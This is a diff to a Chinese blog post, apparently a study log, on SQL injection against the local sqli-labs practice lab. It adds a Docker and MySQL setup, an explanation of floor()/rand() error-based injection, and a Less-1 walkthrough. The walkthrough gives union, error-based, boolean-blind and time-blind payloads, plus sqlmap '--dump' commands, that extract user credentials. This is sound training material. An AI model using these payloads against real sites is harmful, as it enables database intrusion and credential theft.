@@ -22,6 +22,20 @@
 <p>​	（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 </p>
 <p>​	（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
 <h3 id="1-1-MySQL相关知识"><a href="#1-1-MySQL相关知识" class="headerlink" title="1.1 MySQL相关知识"></a>1.1 MySQL相关知识</h3><p>​	在<strong>mysql5</strong>版本以后，存在一个数据库为<code>information_schema</code>，在这个库里面，有三个重要的表：<code>columns</code>，<code>tables</code>，<code>SCHEMATA</code>表，在<code>SCHEMATA</code>表中的字段<code>SCHEMA_NAME</code>存放着数据库的信息。<code>tables</code>表中<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>分别记录库名和表名。<code>columns</code>存储该用户创建的所有数据库的库名、表名和字段名。</p>
+<h4 id="1-1-1-Navicat连接Docker容器内MySQL"><a href="#1-1-1-Navicat连接Docker容器内MySQL" class="headerlink" title="1.1.1 Navicat连接Docker容器内MySQL"></a>1.1.1 Navicat连接Docker容器内MySQL</h4><blockquote>
+<p>有这个需求的原因是我太懒了，因为是用的docker开的sqli labs环境，又不想本地再配MySQL环境，因此干脆直接利用了。</p>
+</blockquote>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ docker run -dt --name sqli-labs -p 8888:80 -p 3307:3306 -e MYSQL_ROOT_PASSWORD=root acgpiano/sqli-labs:latest</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里需要给MySQL开一个端口映射，我这里给的是<code>3307</code>端口。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -it sqli-labs /bin/bash</span><br><span class="line">$ mysql</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来将host修改为<code>%</code>即可。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> host,<span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">'root'</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></tbody></table></figure>
+
+<style>.lulidzqaseur{zoom:50%;}</style><img src="/posts/31899/image-20250306000604769.png" class="lulidzqaseur" alt="image-20250306000604769">
+
+
 <h3 id="1-2-判断是否存在注入"><a href="#1-2-判断是否存在注入" class="headerlink" title="1.2 判断是否存在注入"></a>1.2 判断是否存在注入</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="string">'1'</span><span class="keyword">or</span><span class="string">'1'</span><span class="operator">=</span><span class="string">'1'</span></span><br><span class="line">id<span class="operator">=</span>"1"<span class="keyword">or</span>"1"<span class="operator">=</span>"1"</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>有回显</strong>：页面有数据信息返回。</p>
@@ -32,6 +46,32 @@
 <h3 id="1-4-SQL注入分类"><a href="#1-4-SQL注入分类" class="headerlink" title="1.4 SQL注入分类"></a>1.4 SQL注入分类</h3><p>按注入手法来分：<strong>联合查询、堆叠查询、布尔型、报错型、基于时间延迟</strong>。</p>
 <p>按请求类型来分：<strong>GET注入、POST注入、COOKIE注入。</strong></p>
 <p>按注入数据类型来分：<strong>int型、string型、like型</strong></p>
+<h4 id="1-4-1-报错注入"><a href="#1-4-1-报错注入" class="headerlink" title="1.4.1 报错注入"></a>1.4.1 报错注入</h4><p><strong>XPATH报错注入</strong></p>
+<p><code>updatexml（XML_document，XPath_string，new_value）</code>、<code>extractvalue（XML_document，xpath_string）</code>，XPATH的格式形如<code>/test</code>，如果XPATH出现格式错误，则会爆出XPATH语法错误。</p>
+<p><strong>floor()函数报错</strong></p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="string">'x'</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>rand(0)</code>的重复计算是固定的，会随机生成一个[0,1]的小数，<code>rand(0)*2</code>则生成[0,2]的数，<code>floor()</code>函数是向下取整，即最后结果为0或1。我们运行一下看看。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">8</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/posts/31899/image-20250306001213412.png" class="" title="image-20250306001213412">
+
+<p>可以发现这里<code>floor(rand(0)*2)</code>的值是固定的。</p>
+<p>接下来说一下<code>group by</code>的原理，<code>group by</code>在执行时，会依次取出查询表中的记录创建一个临时表，<code>group by</code>的对象就是该临时表的主键，如果临时表中出现了该主键，则该值加一，若不存在则<strong>插入</strong>。再来看这个SQL语句。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="string">'x'</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></tbody></table></figure>
+
+<p>其键必然为<code>x1</code>或者<code>x0</code>，那么应该只会值增加呀，为什么会报错呢？</p>
+<p>这里有个重要特性：当<code>group by</code>和<code>rand()</code>同时使用时，若该临时表中没有主键，则插入前<code>rand()</code>会再执行一次。</p>
+<p>那么我们来推断一下，第一次执行，<code>key</code>应该为<code>x0</code>，但是<code>x0</code>不存在，因此<code>rand(0)</code>又计算了一遍，最终第一次执行结果为<code>x1</code>。</p>
+<p>第二次执行，这时候<code>key</code>应该为<code>x1</code>，已存在，则值加一即可。</p>
+<p>第三次执行，这时候key应该为<code>x0</code>，不存在，<code>rand(0)</code>重新计算一遍，最终应该插入的<code>key</code>为<code>x1</code>，这里就出了问题了，它会直接插入，从而导致主键重复报错，这就是该报错原理。</p>
+<img src="/posts/31899/image-20250306003105176.png" class="" title="image-20250306003105176">
+
+<p><strong>优化方案</strong></p>
+<p>学习的<a href="https://www.freebuf.com/articles/web/257881.html">这篇文章</a>，将<code>rand(0)</code>改为了<code>rand(14)</code>，运行一下看看。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">14</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">8</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(rand(<span class="number">14</span>)<span class="operator">*</span><span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里只需要两条数据即可报错，但是如果只有一条数据<code>floor()</code>报错注入就不能用了，因为一条数据没办法重复。</p>
 <h2 id="2-SQL注入绕过"><a href="#2-SQL注入绕过" class="headerlink" title="2. SQL注入绕过"></a>2. SQL注入绕过</h2><h3 id="2-1-空格字符绕过"><a href="#2-1-空格字符绕过" class="headerlink" title="2.1 空格字符绕过"></a>2.1 空格字符绕过</h3><p><code>%a0</code>：空格</p>
 <p><code>%09</code>：TAB键（水平）</p>
 <p><code>%0a</code>：新建一行</p>
@@ -221,7 +261,8 @@
 
 
 
-<h2 id="3-sqli-labs通关"><a href="#3-sqli-labs通关" class="headerlink" title="3. sqli-labs通关"></a>3. sqli-labs通关</h2><h3 id="3-1-准备工作"><a href="#3-1-准备工作" class="headerlink" title="3.1 准备工作"></a>3.1 准备工作</h3><p><strong>sqli-labs环境搭建</strong></p>
+<h2 id="3-sqli-labs通关"><a href="#3-sqli-labs通关" class="headerlink" title="3. sqli-labs通关"></a>3. sqli-labs通关</h2><p>这里跟着<a href="https://www.sqlsec.com/2020/05/sqlilabs.html">国光佬</a>学习</p>
+<h3 id="3-1-准备工作"><a href="#3-1-准备工作" class="headerlink" title="3.1 准备工作"></a>3.1 准备工作</h3><p><strong>sqli-labs环境搭建</strong></p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line">docker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></tbody></table></figure>
 
 <p>中间可能报错，只需要关闭代理就行。</p>
@@ -230,8 +271,35 @@
 <p>访问网页，环境搭建完毕。</p>
 <img src="/posts/31899/image-20250305014536324.png" class="" title="image-20250305014536324">
 
-<p>查看相关版本细节。</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -it sqli-labs /bin/bash</span><br><span class="line">$ mysql -e <span class="string">"select version(),user()"</span></span><br><span class="line">+-------------------------+----------------+</span><br><span class="line">| version()               | user()         |</span><br><span class="line">+-------------------------+----------------+</span><br><span class="line">| 5.5.44-0ubuntu0.14.04.1 | root@localhost |</span><br><span class="line">+-------------------------+----------------+</span><br><span class="line">$ php --version</span><br><span class="line">PHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)</span><br><span class="line">Copyright (c) 1997-2014 The PHP Group</span><br><span class="line">Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies</span><br><span class="line">$ <span class="built_in">cd</span> /etc/init.d/ &amp;&amp; apache2 -v</span><br><span class="line">Server version: Apache/2.4.7 (Ubuntu)</span><br><span class="line">Server built:   Oct 14 2015 14:20:21</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="3-2-Less-1-20"><a href="#3-2-Less-1-20" class="headerlink" title="3.2 Less 1-20"></a>3.2 Less 1-20</h3><h4 id="3-2-1-Less-1"><a href="#3-2-1-Less-1" class="headerlink" title="3.2.1 Less-1"></a>3.2.1 Less-1</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">  	<span class="string">"hahahaha"</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());  </span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>联合注入</strong></p>
+<p>手工</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23 # 查库</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>"security")<span class="operator">%</span><span class="number">23</span> # 查表</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name="users")%23 # 查字段</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(username,password SEPARATOR <span class="number">0x3c62723e</span>) <span class="keyword">from</span> users)<span class="operator">%</span><span class="number">23</span> # <span class="number">0x3c62723e</span><span class="operator">=</span><span class="operator">&lt;</span>br<span class="operator">&gt;</span>，即按换行分割</span><br></pre></td></tr></tbody></table></figure>
+
+<p>sqlmap</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=U -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>报错注入</strong></p>
+<p>手工</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and updatexml(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e),1)%23</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>sqlmap</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=E -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>布尔盲注</strong></p>
+<p>手工</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67 %23 # 有回显</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">68</span> <span class="operator">%</span><span class="number">23</span> # 无回显</span><br></pre></td></tr></tbody></table></figure>
+
+<p>sqlmap</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=B -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>时间盲注</strong></p>
+<p>手工</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;68,1,sleep(5)) %23</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>sqlmap</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://localhost:8888/Less-1/?id=1"</span> --technique=T -v 3 -D security -T <span class="built_in">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>
 
 ]]></content>
       <tags>
